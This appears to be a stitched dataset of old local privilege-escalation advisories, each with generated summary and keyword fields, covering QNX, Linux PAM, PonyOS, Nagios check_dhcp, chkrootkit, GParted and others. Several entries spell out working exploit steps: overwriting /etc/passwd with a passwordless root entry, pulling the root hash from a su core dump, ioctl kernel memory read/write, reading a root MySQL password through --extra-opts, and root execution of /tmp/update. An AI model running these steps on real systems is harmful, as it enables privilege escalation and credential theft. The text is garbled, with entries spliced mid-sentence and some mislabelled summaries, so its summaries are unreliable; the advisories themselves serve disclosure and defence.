OpenLDAP meeting specific configuration criteria. The vulnerability is not specified in source. Not specified in source. #<-- Layman's Document Summary (LDS) --># An attacker can exploit a symlink misconfiguration in OpenLDAP to delete files on the target filesystem without needing direct access to the directory. This occurs because the software does not verify if the symlink points to an intended location before performing file operations. The flaw impacts certain Linux distributions and Unix systems with specific OpenLDAP versions. The issue is not specified in source. #<-- Key Words (KW) --># OpenLDAP, symbolic link, world-writable directory, file deletion, symlink vulnerability, slapd.conf, NEXTID, RedHat 6.1, RedHat 6.2, TurboLinux, CVE-2000-0336 #<-- Related Terms --># symlink, world-writable directory, OpenLDAP, file deletion vulnerability, Unix symlink misconfiguration, CVE-2000-0336 #<-- Entities/Attributes --># Software: OpenLDAP, /usr/tmp (symlink), slapd.conf, RedHat 6.1, RedHat 6.2, TurboLinux 6.0.2, NEXTID function, world-writable directory #<-- Vulnerability Type --># Not specified in source #<-- Original Content --># source: https://www.securityfocus.com/bid/1232/info A vulnerability exists in OpenLDAP as shipped with some versions of Linux, including RedHat 6.1 and 6.2, and TurboLinux 6.0.2 and earlier. OpenLDAP will create files in /usr/tmp, which is actually a symbolic link to the world writable /tmp directory. As OpenLDAP does not check for a files existence prior to opening the files in /usr/tmp, it is possible for an attacker to point an appropriately named symbolic link at any file on the filesystem, and cause it to be destroyed. Certain versions of LBNL traceroute are vulnerable to an interesting attack involving freeing of pointers pointing to unallocated memory. When traceroute is executed with the arguments "-g x -g x", the function "savestr()" is called twice. savestr() does what strdup() does without the extra malloc() call and is used when parsing the hostname or "dotted quad notation" ip address argument to the -g parameter. It uses a block of pre-allocated memory instead of allocating memory itself. After the first instance of "-g" is parsed and savestr() is called, the pointer to the block used by savestr() is unallocated via free(). When the next gateway parameter (-g) is interpreted, savestr() is called again and the user data argument is written to the block of unallocated memory. Like in the first instance, free() is called on the pointer to where the data begins inside the old-buffer of unallocated memory. When free() doesn't find a valid malloc header before the pointer it is passed, traceroute crashes. What makes this possibly exploitable is that the region of memory to which the pointer points is user-controlled and can be written to with (somewhat) arbitrary data before free() is called. An attacker may be able to construct a malicious malloc() header and carefully stuff it into the first savestr() buffer, so that is there when free() looks for it after the second savestr(). What complicates exploitation of this issue are the functions involved with savestr(), inet_addr() and gethostbyname(), which limit the type of user data that can be put into the buffer (which would need to be binary). If pulled off, however, it may be possible to overwrite aribitrary locations in the heap (such as a function pointer) with arbitrary data. If successfully exploited this would yield local root access for the attacker. LBL traceroute exploit. The lpr package that ships with RedHat Linux 6.2 (and possibly earlier versions) contains a vulnerability that will allow an attacker to execute arbitrary commands with the privileges of group 'lp'. The vulnerability is not in one of the binary executables, rather in one of the print filters supplied with the lpr package. It is in the processing of troff files, their conversion into postscript files for printing on a postscript printer. When the processing occurs, certain commands embedded in the troff file being processed can be executed -- with the privileges of the setgid lpr. This is the result of formatting programs being executed by the print filter in an unsafe manner. Compromise of group lp access may lead to further compromise as the lpr configuration files are writeable to members of group lp. If lpr configuration files are modified, arbitrary commands can be run as any user other than root. This will most certainly eventually lead to root access for the attacker (a excellent example of this is in the zenith parsec's bugtraq post in the reference section). Not specified in source. #<-- Key Words (KW) --># ptrace, ptrace_attach, non-readable file, kernel 2.2.x, Linux, ptrace permission, process tracing, core memory disclosure, security focus, exploit db, vulnerability classification #<-- Related Terms --># trace, ptrace, privilege escalation, information disclosure, kernel vulnerability, non-readable executable, binary protection bypass, strace, read-only file, memory inspection #<-- Entities/Attributes --># Source: Linux Kernel 2.2.x, ptrace, non-readable file, process ID, file permissions, security focus database, exploit-db entry #<-- Vulnerability Type --># Not specified in source #<-- Original Content --># source: https://www.securityfocus.com/bid/2044/info Ptrace is a unix system call that is used to analyze running processes, usually for breakpoint debugging. The linux implementation of ptrace in 2.2.x kernels (and possibly earlier versions) contains a vulnerability that may allow an attacker to gain sensitive information in non-readable non-setuid executable files. For security reasons, regular users are not allowed to ptrace setuid programs (or attach to processes running as another uid) nor are they allowed to trace processes originating from un-readable disk images (binary files). #<-- Publish Date --># 2002-05-31 #<-- Technical Document Summary (TDS) --># The QNX RTOS monitor utility contains a vulnerability that allows a local attacker to overwrite arbitrary system files by using the -f command line option. Once the file is overwritten, the attacker gains ownership of the target file. The affected component is the QNX RTOS monitor service installed with setuid root privileges. This issue was published on SecurityFocus with identifier CVE-2002-0793 and OSVDB-12215. <<< #<-- Layman's Document Summary (LDS) --># A local attacker can modify critical system files like /etc/passwd by using the -f option with the monitor utility. This allows unauthorized changes to system configuration without authentication. The vulnerability stems from improper validation of user-supplied file paths in the monitor command. <<< #<-- Key Words (KW) --># QNX RTOS, monitor, arbitrary file modification, setuid root, CVE-2002-0793, OSVDB-12215, file overwrite, local privilege escalation <<< #<-- Related Terms --># arbitrary file write, system file manipulation, QNX, monitor utility, vulnerability, privilege escalation <<< #<-- Entities/Attributes --># Software: QNX RTOS, monitor command line option -f, /etc/passwd, setuid root, CVE-2002-0793, OSVDB-12215, local attacker <<< #<-- Vulnerability Type --># Not specified in source <<< #<-- Original Content --># source: https://www.securityfocus.com/bid/4902/info The QNX RTOS monitor utility is prone to an issue which may allow local attackers to modify arbitrary system files (such as /etc/passwd). monitor is installed setuid root by default. #<-- Publish Date --># 2002-05-31 #<-- Technical Document Summary (TDS) --># The QNX RTOS debugging utility 'dumper' creates memory dump files by following symbolic links and assigns ownership of the resulting file to the userid of the terminated process. A malicious local attacker can exploit this behavior to overwrite arbitrary files, potentially gaining root privileges by modifying critical system files such as '/etc/passwd'. This vulnerability stems from the utility's handling of file ownership during dump creation. Not specified in source. #<-- Layman's Document Summary (LDS) --># The weakness allows an attacker to change file ownership without elevated privileges, which could be used to bypass security checks or hide malicious activity. The exploit involves creating a symbolic link and terminating a process to manipulate file ownership. This can lead to privilege escalation by overwriting system files like '/etc/passwd'. Not specified in source. #<-- Key Words (KW) --># QNX RTOS, dumper, symbolic links, file ownership, CVE-2002-0793, OSVDB-12216, privilege escalation, memory dump, userid, /etc/passwd #<-- Related Terms --># arbitrary file modification, ownership change, root privileges, symbolic link exploitation, QNX debugging utility, file system manipulation, local attack, vulnerability disclosure #<-- Entities/Attributes --># Software: QNX RTOS, dumper utility; Vulnerability: CVE-2002-0793; File path: /etc/passwd; Process termination; Userid assignment; Ownership change #<-- Vulnerability Type --># Not specified in source #<-- Original Content --># source: https://www.securityfocus.com/bid/4904/info When creating memory dump files, the QNX RTOS debugging utility 'dumper' follows symbolic links. It also sets ownership of the file to the userid of the terminated process. It is possible for malicious local attackers to exploit this vulnerability to overwrite and gain ownership of arbitrary files. Consequently, attackers may elevate to root privileges by modifying files such as '/etc/passwd'. Example exploit, with /bin/dumper: Let EVIL be the unprivileged user who wants to gain root access. #link to the passwd file: dumper dumps to [process name].dmp $ ln /etc/passwd /home/EVIL/ksh.dmp #call the program that will attempt to write to the hard link $ dumper -d /home/EVIL -p [PID of EVIL's ksh] #have dumper do its job by terminating the monitored process $ exit #at this point, /etc/passwd is overwritten by the binary dump, and more importantly: EVIL is now the owner ! $ echo root::0:0::///:/bin/sh > /etc/passwd #but now no login works because /etc/passwd is not owned by userid 0. #So you do: $ passwd #and change your password. This gives /etc/passwd ownership back to root, keeping the modifications you have made. $ su #

#<-- Publish Date --># 2002-06-03 #<-- Technical Document Summary (TDS) --># The exploit leverages a kernel-based vulnerability that causes the 'su' utility on QNX RTOS to dump a world-readable core file upon receiving the SIGSEGV signal. This allows an attacker to extract sensitive information such as the root user's password hash from /var/dumps/su.core. The weakness resides in how the kernel handles segmentation fault signals for setuid processes, enabling arbitrary data disclosure without authentication bypass. #<-- Layman's Document Summary (LDS) --># The flaw is a kernel-level issue where the 'su' command on QNX RTOS improperly processes SIGSEGV signals, leading to an exposed core dump that reveals sensitive credentials. This allows an attacker to read the root password hash stored in the core file. #<-- Key Words (KW) --># QNX RTOS, su, SIGSEGV, core dump, password hash disclosure, kernel vulnerability, setuid programs #<-- Related Terms --># password hash, core file, segmentation fault, QNX, operating system, credential extraction, SIGSEGV handling #<-- Entities/Attributes --># Software: QNX RTOS, su utility; Signal: SIGSEGV; File path: /var/dumps/su.core; Attribute: root password hash; Vulnerability source: Linux kernel #<-- Vulnerability Type --># Not specified in source #<-- Original Content --># source: https://www.securityfocus.com/bid/4914/info It has been reported that the 'su' utility for QNX RTOS accepts the SIGSEGV signal and dumps a world readable core file. An attacker is able to analyze the core file and obtain very sensitive information. It is very probable that this is a kernel-based vulnerability affecting not only 'su', but other setuid programs as well $su > /dev/null & $kill -SEGV `ps -A | grep su | awk {'print $1'}` $strings /var/dumps/su.core | grep ":0:0" > /tmp/mypasswd The attacker has effectively obtained a copy of the root user's password hash.

#<-- Publish Date --># 2003-06-16 #<-- Technical Document Summary (TDS) --># The vulnerability resides in the Linux-PAM pam_wheel module where the getlogin() function is used without credential verification for wheel group members, allowing privilege escalation. It permits a local attacker to impersonate any logged-in user of the wheel group by spoofing the username. This can lead to root access on the system. The issue was discovered in PAM version 0.77. #<-- Layman's Document Summary (LDS) --># A local authentication flaw lets an attacker pretend to be another user, specifically someone with wheel group privileges, without needing a password. This could let them take over the system as that user. It occurs when the pam_wheel module doesn't check if the user's UID matches the one returned by getlogin(). #<-- Key Words (KW) --># Linux PAM, pam_wheel, getlogin, privilege escalation, wheel group, credential bypass, local authentication, root access, CVE-2003-0388, OSVDB-9027, username spoofing, credential verification failure #<-- Related Terms --># PAM (Password Authentication Protocol), wheel group, local privilege escalation, credential omission, authentication bypass, Linux kernel, root user, sudo-like functionality, vulnerability disclosure #<-- Entities/Attributes --># Software: Linux-PAM, pam_wheel module, getlogin function, wheel group, UID, PAM version 0.77, local system, root account, CVE-2003-0388, OSVDB-9027 #<-- Vulnerability Type --># Privilege escalation via authentication bypass in the Linux-PAM pam_wheel module due to missing user credential verification. #<-- Original Content --># source: https://www.securityfocus.com/bid/7929/info A vulnerability has been discovered in the Linux-Pam pam_wheel module. The problem exists in the way the module authenticates users under certain configurations. Specifically, if the module is configured to allow wheel group members to use the 'su' utility without supplying credentials and is not configured to verify the user's UID, it may be possible for a local attacker to elevated privileges. This can be accomplished by spoofing the users login named, returned by the getlogin() function, to that of a logged in user of the wheel group. #<-- Publish Date --># 2013-04-08 #<-- Technical Document Summary (TDS) --># The advisory describes two vulnerability classes: a userland privilege escalation via an ioctl handler in tty.c that permits arbitrary read/write of kernel memory, and a kernel-level ioctl buffer overflow in winsize struct handling. Exploits involve crafting malicious ioctl requests to leak or modify kernel data structures, enabling uid elevation without authentication. The affected component is the PonyOS kernel, specifically the tty.c and winsize definitions. No successful exploitation is demonstrated; only theoretical attack vectors are described. The vulnerability stems from improper validation of user-supplied address arguments in system calls. Not specified in source. #<-- Layman's Document Summary (LDS) --># The weakness lies in unchecked input to ioctl system calls that read/write kernel memory without bounds checking. An attacker can manipulate the address argument to access arbitrary kernel regions, such as the winsize structure, and modify its contents. This allows privilege escalation by altering process identifiers or other critical fields. The flaw is present in PonyOS 0.4.99-mlp on Linux systems. #<-- Key Words (KW) --># PonyOS, ioctl, TDIOCSWINSZ, TIOCGWINSZ, winsize, uid, kernel memory, privilege escalation, format string bug, syscall, exploit, vulnerability #<-- Related Terms --># security audit, local vulnerability, command injection, arbitrary read write, kernel exploitation, PonyOS security issues #<-- Entities/Attributes --># Software: PonyOS, tty.c, winsize, uid, kernel, ioctl, format string bug, syscall_fstat, shell_commands_len, argv, context #<-- Vulnerability Type --># Not specified in source #<-- Original Content --># Advisory: PonyOS Security Issues John Cartwright <johnc@grok.org.uk> Introduction ------------ Like countless others, I was pretty excited about PonyOS yesterday (April 1st 2013) and decided to give it a go. After wasting a lot of time nyan'ing, I knew this was the future of desktop OSes. However, I wondered how secure PonyOS really was. So, I took a look at the source, which revealed that our ponies may be in danger of compromise! All bugs tested against PonyOS 0.4.99-mlp from ponyos.org. Userland Compromise ------------------- Take a look at this snippet from login.c: int uid = checkUserPass(username, password); if (uid < 0) { fprintf(stdout, "\nLogin failed.\n"); continue; } system("cat /etc/motd"); pid_t pid = getpid(); uint32_t f = fork(); if (getpid() != pid) { /* TODO: Read appropriate shell from /etc/passwd */ set_username(); set_homedir(); set_path(); char * args[] = { "/bin/sh", NULL }; syscall_setuid(uid); int i = execvp(args[0], args); It seems that login runs 'cat' before dropping privileges. This is easy to exploit, given that the file permissions don't work. Just log in as 'local', and replace the 'cat' binary with another ELF - 'whoami' will do nicely for a PoC. Then log out, and back in again. This causes your binary to run as uid 0. Exciting stuff! Kernel Compromise ----------------- Obviously userland exploits are boring and it was important that I find some kernel holes to play with. Luckily PonyOS has quite a few for your enjoyment. You can abuse syscall_fstat() to write the contents of the stat buf to an arbitrary kernel location if you so wish. There are a few other similar

What we have here is pretty much an arbitrary read/write of kernel memory. Want to read the value of 0x11223344 ? struct winsize ws; ioctl(0, TIOCSWINSZ, (void *)0x11223344); ioctl(0, TIOCGWINSZ, &ws); printf("%x %x %x %x\n", ws.ws_col, ws.ws_row, ws.ws_xpixel, ws.ws_ypixel); Want to zero the memory at that address? struct winsize ws; memset(&ws, '\0', sizeof(struct winsize)); ioctl(0, TIOCSWINSZ, &ws); ioctl(0, TIOCGWINSZ, (void *)0x11223344); Using these two primitives it is possible to dump out a large chunk of the kernel memory, find the process list, user_t, etc and patch it appropriately to change your uid. Having said that, there are some other bugs that could help you if you really wanted to attack PonyOS, given command line access. For example, there is a perfectly good format string bug in the shell: for (int i = 0; i < shell_commands_len; ++i) { if (strstr(shell_commands[i], argv[0]) == shell_commands[i]) { list_insert(matches, shell_commands[i]); match = shell_commands[i]; } } if (matches->length == 0) { list_free(matches); return; } else if (matches->length == 1) { for (int j = 0; j < strlen(context->buffer); ++j) { printf("\010 \010"); } printf(match); This can be triggered by going into /bin and creating an empty file called (for example) %08x%08x. The flaw stems from a null pointer dereference where an uninitialized kernel object (ibuf->ops) is used as a function pointer, allowing arbitrary code execution. This weakness resides in the kernel's file I/O subsystem and enables attackers to gain superuser privileges on affected systems. The vulnerability was present in Linux 2.6.16 through 2.6.17.6 before a patch was released. #<-- Layman's Document Summary (LDS) --># This flaw allows an attacker with local access to obtain root privileges by exploiting a bug in the kernel's file handling code, which can then be used to disable security modules like SELinux and modify system configurations. #<-- Key Words (KW) --># Linux kernel, sys_tee, privilege escalation, null pointer dereference, local root exploit, kernel vulnerability, fs/splice.c, LKML #<-- Related Terms --># null pointer dereference, local privilege escalation, kernel bug, sys_tee function, file I/O subsystem, SELinux bypass, root access #<-- Entities/Attributes --># Linux kernel 2.6.16, Linux 2.6.17.6, SuSE, ibuf->ops, local root exploit, /bin/bash, patch release #<-- Vulnerability Type --># Not specified in source #<-- Original Content --># source: https://www.securityfocus.com/bid/22823/info The Linux kernel is prone to a local privilege-escalation vulnerability. Linux 2.6.16 -> 2.6.17.6 local root exploit in sys_tee() ------------------------------------------------------------ *proof that null ptr dereference bugs can be exploited* ------------------------------------------------------------ Bug in fs/splice.c was silently fixed in 2.6.17.7, even though the SuSE developer who fixed the bug knew it to be a "local DoS" Changelog stated only: "splice: fix problems with sys_tee()" On LKML, the user reporting tee() problems said the oops was at ibuf->ops->get(ipipe, ibuf), where ibuf->ops was NULL Exploitation is trivial, mmap buffer at address 0, 7th dword is used as a function pointer by the kernel (the get()) ------------------------------------------------------------ May need to run multiple times to catch race. #<-- Publish Date --># 2014-05-16 #<-- Technical Document Summary (TDS) --># The plugin reads INI configuration files using the --extra-opts option without proper validation. This allows an attacker with root SUID privileges to access sensitive information stored in root-owned INI files. The vulnerability stems from insufficient input sanitization when parsing command-line arguments. Affected component is the check_dhcp binary within Nagios Plugins 2.0.1 on Linux systems. #<-- Layman's Document Summary (LDS) --># An unprivileged user can read root-owned INI configuration files by using the --extra-opts option with the check_dhcp tool. This functionality exists because the plugin runs as a setuid binary without proper access controls, exposing sensitive data to anyone with local system access. #<-- Key Words (KW) --># Nagios plugins, INI files, SUID bit, root privileges, password disclosure, check_dhcp, extra-opts, vulnerability advisory #<-- Related Terms --># setuid, INI configuration, Nagios, privilege escalation, password exposure, command-line argument parsing, vulnerability advisory #<-- Entities/Attributes --># Nagios Plugins 2.0.1, /usr/local/nagios/libexec/check_dhcp, root SUID, Linux, MySQL, extra-opts, check_dhcp plugin, id command #<-- Vulnerability Type --># Information disclosure through improper input validation in a setuid binary #<-- Original Content --># ============================================= - Release date: 15.05.2014 - Discovered by: Dawid Golunski - Severity: Moderate ============================================= I. VULNERABILITY ------------------------- check_dhcp - Nagios Plugins <= 2.0.1 Arbitrary Option File Read II. BACKGROUND ------------------------- "Nagios is an open source computer system monitoring, network monitoring and infrastructure monitoring software application. Nagios offers monitoring and alerting services for servers, switches, applications, and services. It alerts the users when things go wrong and alerts them a second time when the problem has been resolved. Nagios Plugins (Official) The Nagios Plugins Development Team maintains a bundle of more than fifty standard plugins for Nagios and other monitoring applications that use the straightforward plugin interface originally invented by the Nagios folks. Each plugin is a stand-alone command line tool that provides a specific type of check. Typically, your monitoring software runs these plugins to determine the current status of hosts and services on your network. Some of the provided plugins let you check local system metrics (such as load averages, processes, or disk space usage), others use various network protocols (such as ICMP, SNMP, or HTTP) to perform remote checks. This allows for checking a large number of common host and service types. * check_dhcp plugin This plugin tests the availability of DHCP servers on a network." III. INTRODUCTION ------------------------- check_dhcp plugin that is a part of the official Nagios Plugins package contains a vulnerability that allows a malicious attacker to read parts of INI config files belonging to root on a local system. It could allow an attacker to obtain sensitive information like passwords that should only be accessible by root user. The vulnerability is due to check_dhcp plugin having Root SUID permissions and inappropriate access control when reading user provided config file. IV. DESCRIPTION ------------------------- check_dhcp requires a root SUID permission on the program binary file in order to run correctly. Default installation of check_dhcp when installed from sources assigns the setuid bit automatically

due to check_dhcp plugin having Root SUID permissions and inappropriate access control when reading user provided config file. IV. DESCRIPTION ------------------------- check_dhcp requires a root SUID permission on the program binary file in order to run correctly. Default installation of check_dhcp when installed from sources assigns the setuid bit automatically on the file: # ./configure ; make ; make install # ls -l /usr/local/nagios/libexec/check_dhcp -r-sr-xr-x 1 root root 171188 May 12 23:26 /usr/local/nagios/libexec/check_dhcp As we can see in the provided help the plugin allows for reading options from a supplied config file by using --extra-opts option: # /usr/local/nagios/libexec/check_dhcp --help check_dhcp v2.0.1 (nagios-plugins 2.0.1) ... Usage: check_dhcp [-v] [-u] [-s serverip] [-r requestedip] [-t timeout] [-i interface] [-m mac] Options: ... --extra-opts=[section][@file] Read options from an ini file. See https://www.nagios-plugins.org/doc/extra-opts.html for usage and examples. The option could be used to read parts of any INI format config files available on the system. Because check_dhcp is running as root (thanks to SETUID bit) and does not drop the root privileges when accessing the config file nor does it check if a given file should be accessible by the user executing it any root ini-config file can be accessed this way by an unprivileged user on the local system. Ironically, the extra-opts.html document states "The initial use case for this functionality is for hiding passwords, so you do not have to define sensitive credentials in the Nagios configuration and these options won't appear in the command line." V. PROOF OF CONCEPT ------------------------- A good example of a program that stores configuration in INI format is MySQL. Administrators often save mysql credentials in /root/.my.cnf to avoid having to type them each time when running a mysql client. Storing mysql passwords in a config file is also suggested for safety in MySQL docs : http://dev.mysql.com/doc/refman/5.7/en/password-security-user.html An example mysql config file could look like this: # cat /root/.my.cnf [mysqldump] quick [mysql] # saved password for the mysql root user password=myRootSecretMysqlPass123 If an unprivileged attacker had access to a system containing SUID binary of check_dhcp plugin he could easily use it to retrieve the password contained in /root/.my.cnf file: [attacker@localhost ~]$ id uid=500(attacker) gid=500(attacker) groups=500(attacker) [attacker@localhost ~]$ /usr/local/nagios/libexec/check_dhcp -v --extra-opts=mysql@/root/.my.cnf /usr/local/nagios/libexec/check_dhcp: unrecognized option '--password=myRootSecretMysqlPass123' Usage: check_dhcp [-v] [-u] [-s serverip] [-r requestedip] [-t timeout] [-i interface] [-m mac] As we can see the contents of the 'mysql' section of /root/.my.cnf option file gets printed as a part of the error message revealing its contents to the attacker. VI. BUSINESS IMPACT ------------------------- Malicious user that has local access to a system where check_dhcp plugin is installed with SUID could exploit this vulnerability to read any INI format config files owned by root and potentially extract some sensitive information. VII. SYSTEMS AFFECTED ------------------------- Systems with check_dhcp SUID binary installed as a part of Nagios Plugins 2.0.1 or older are vulnerable. VIII. #<-- Publish Date --># 2014-06-28 #<-- Technical Document Summary (TDS) --># The exploit leverages a missing quotation mark around the variable assignment `file_port=$file_port $i`, causing the shell to interpret `$i` as an environment variable expansion rather than a literal string. This allows execution of arbitrary files listed in `$SLAPPER_FILES` with root privileges when the chkrootkit service runs as the root user. The vulnerability resides in the slapper() function within the chkrootkit package, affecting Linux systems using the `netstat` and `awk` utilities. Affected component: chkrootkit version 0.49; weakness: improper quoting leading to command injection via file path concatenation. Exploitation mechanism: conditional check of network ports triggers execution of files in /tmp if a specific port is listening, enabling root code execution when malicious content resides in those files. Not specified in source. #<-- Layman's Document Summary (LDS) --># The flaw occurs because the script fails to properly quote variables when building file paths, allowing an attacker to inject additional commands through crafted filenames. This could let a malicious actor gain root access if they can place a file with a specific name in /tmp. The issue is a classic example of improper input handling leading to unauthorized command execution on a Linux system. #<-- Key Words (KW) --># chkrootkit, slapper, local privilege escalation, missing quotation marks, noexec mount, TCP port scanning, file execution, root access, CVE-2014-0476 #<-- Related Terms --># privilege escalation, command injection, shell script vulnerability, Unix exploit, network service detection, file path concatenation, local attack, Linux kernel #<-- Entities/Attributes --># software: chkrootkit version 0.49; function: slapper; variable: SLAPPER_FILES; port specification: netstat -p; CVE identifier: CVE-2014-0476 #<-- Vulnerability Type --># Not specified in source #<-- Original Content --># We just found a serious vulnerability in the chkrootkit package, which may allow local attackers to gain root access to a box in certain configurations (/tmp not mounted noexec). The vulnerability is located in the function slapper() in the shellscript chkrootkit: # # SLAPPER.{A,B,C,D} and the multi-platform variant # slapper (){ SLAPPER_FILES="${ROOTDIR}tmp/.bugtraq ${ROOTDIR}tmp/.bugtraq.c" SLAPPER_FILES="$SLAPPER_FILES ${ROOTDIR}tmp/.unlock ${ROOTDIR}tmp/httpd \ ${ROOTDIR}tmp/update ${ROOTDIR}tmp/.cinik ${ROOTDIR}tmp/.b"a SLAPPER_PORT="0.0:2002 |0.0:4156 |0.0:1978 |0.0:1812 |0.0:2015 " OPT=-an STATUS=0 file_port= if ${netstat} "${OPT}"|${egrep} "^tcp"|${egrep} "${SLAPPER_PORT}"> /dev/null 2>&1 then STATUS=1 [ "$SYSTEM" = "Linux" ] && file_port=`netstat -p ${OPT} | \ $egrep ^tcp|$egrep "${SLAPPER_PORT}" | ${awk} '{ print $7 }' | tr -d :` fi for i in ${SLAPPER_FILES}; do if [ -f ${i} ]; then file_port=$file_port $i STATUS=1 fi done if [ ${STATUS} -eq 1 ] ;then echo "Warning: Possible Slapper Worm installed ($file_port)" else if [ "${QUIET}" != "t" ]; then echo "not infected"; fi return ${NOT_INFECTED} fi } The line 'file_port=$file_port $i' will execute all files specified in $SLAPPER_FILES as the user chkrootkit is running (usually root), if $file_port is empty, because of missing quotation marks around the variable assignment. Steps to reproduce: - Put an executable file named 'update' with non-root owner in /tmp (not mounted noexec, obviously) - Run chkrootkit (as uid 0) Result: The file /tmp/update will be executed as root, thus effectively rooting your box, if malicious

because of missing quotation marks around the variable assignment. Steps to reproduce: - Put an executable file named 'update' with non-root owner in /tmp (not mounted noexec, obviously) - Run chkrootkit (as uid 0) Result: The file /tmp/update will be executed as root, thus effectively rooting your box, if malicious content is placed inside the file. If an attacker knows you are periodically running chkrootkit (like in cron.daily) and has write access to /tmp (not mounted noexec), he may easily take advantage of this. Suggested fix: Put quotation marks around the assignment. file_port="$file_port $i" I will also try to contact upstream, although the latest version of chkrootkit dates back to 2009 - will have to see, if I reach a dev there.

#<-- Publish Date --># 2014-12-23 #<-- Technical Document Summary (TDS) --># GParted version ≤ 0.14.1 allows unsanitized user input to be passed directly to OS commands executed with root privileges, enabling command injection when an external storage device’s filesystem label is incorporated into a mount path. The vulnerability stems from insufficient validation of strings supplied to the mkfs.ext2 command, which is invoked without proper encoding or escaping. This flaw permits an attacker to manipulate command arguments and achieve elevated privilege actions on the system. The affected component is GParted, a free partition editor for Linux distributions. The exploit does not claim successful exploitation but describes the mechanism as demonstrated in the advisory. Not specified in source. #<-- Layman's Document Summary (LDS) --># The software does not properly sanitize input before using it in system commands, allowing an attacker to run commands indirectly through a malicious filesystem label. This lets an attacker cause the system to reboot without direct user interaction. Avoided technical jargon; explains that an automounter can trigger command execution when mounting a filesystem whose label contains specially crafted text. #<-- Key Words (KW) --># GParted, OS command injection, root privileges, mkfs.ext2, CVE-2014-7208, Linux, GParted 0.14.1, security advisory #<-- Related Terms --># command injection, filesystem label, automounter, root execution, partition editor, vulnerability classification #<-- Entities/Attributes --># Software: GParted Version: <=0.14.1 Vendor: SEC Consult Vulnerability Lab Platform: Linux File paths: /dev/sdXX, mount point, filesystem label Operating system: Linux CVE identifier: CVE-2014-7208 #<-- Vulnerability Type --># Not specified in source #<-- Original Content --># SEC Consult Vulnerability Lab Security Advisory < 20141218-1 > ======================================================================= title: OS Command Execution product: GParted - Gnome Partition Editor vulnerable version: <=0.14.1 fixed version: >=0.15.0, <=0.14.1 with fix for CVE-2014-7208 applied CVE number: CVE-2014-7208 impact: medium homepage: http://gparted.org/ found: 2014-07 by: W. Ettlinger SEC Consult Vulnerability Lab https://www.sec-consult.com ======================================================================= Vendor description: ------------------- "GParted is a free partition editor for graphically managing your disk partitions. With GParted you can resize, copy, and move partitions without data loss, enabling you to: * Grow or shrink your C: drive * Create space for new operating systems * Attempt data rescue from lost partitions" URL: http://gparted.org/index.php Vulnerability overview/description: ----------------------------------- Gparted <=0.14.1 does not properly sanitize strings before passing them as parameters to an OS command. Those commands are executed using root privileges. Parameters that are being used for OS commands in Gparted are normally determined by the user (e.g. disk labels, mount points). However, under certain circumstances, an attacker can use an external storage device to inject command parameters. These circumstances are met if for example an automounter uses a filesystem label as part of the mount path. Please note that GParted versions before 0.15 are still being used in distributions. E.g Debian Wheezy is vulnerable to this issue before applying the patches. Proof of concept: ----------------- The following command creates a malicious filesystem. # mkfs.ext2 -L "\`reboot\`" /dev/sdXX When this filesystem is mounted by an automounter to a mountpoint containing the filesystem label and the user tries to unmount

#<-- Publish Date --># 2011-04-29 #<-- Technical Document Summary (TDS) --># The vulnerability allows an attacker to elevate privileges by exploiting a local privilege escalation issue within OProfile. #<-- Publish Date --># 2015-01-11 #<-- Technical Document Summary (TDS) --># The exploit leverages a local privilege escalation vulnerability in the Software Manager (swmng.app) binary. The flaw allows installation of arbitrary packages without verification when executed through the elevated service. #<-- Layman's Document Summary (LDS) --># An attacker can gain root privileges by installing a malicious RPM package using the Software Manager as root. This vulnerability permits unauthorized software installation and execution with elevated privileges, bypassing standard security controls. #<-- Key Words (KW) --># RedStar 3.0, Software Manager swmng.app, local privilege escalation, unsigned RPM package, sudo, SELinux, Fedora 15, bin-sploits/35749.rpm #<-- Related Terms --># Local privilege escalation, unsigned package installation, RedHat-based system, binary exploitation, root shell acquisition, software manager vulnerability #<-- Entities/Attributes --># Software: Software Manager (swmng.app), Package: RPM, OS: Red Star 3.0, Platform: Linux, Command: rootsh, CVE identifiers: Not specified in source #<-- Vulnerability Type --># Local privilege escalation #<-- Original Content --># The root user is disabled on Red Star, and it doesn't look like there is a way to enable it. To get root, get this RPM package I made into Red Star through an ISO (if you're using a virtual machine) or USB key, double-click it to open it with the Software Manager, and click through the blue buttons until it’s done.
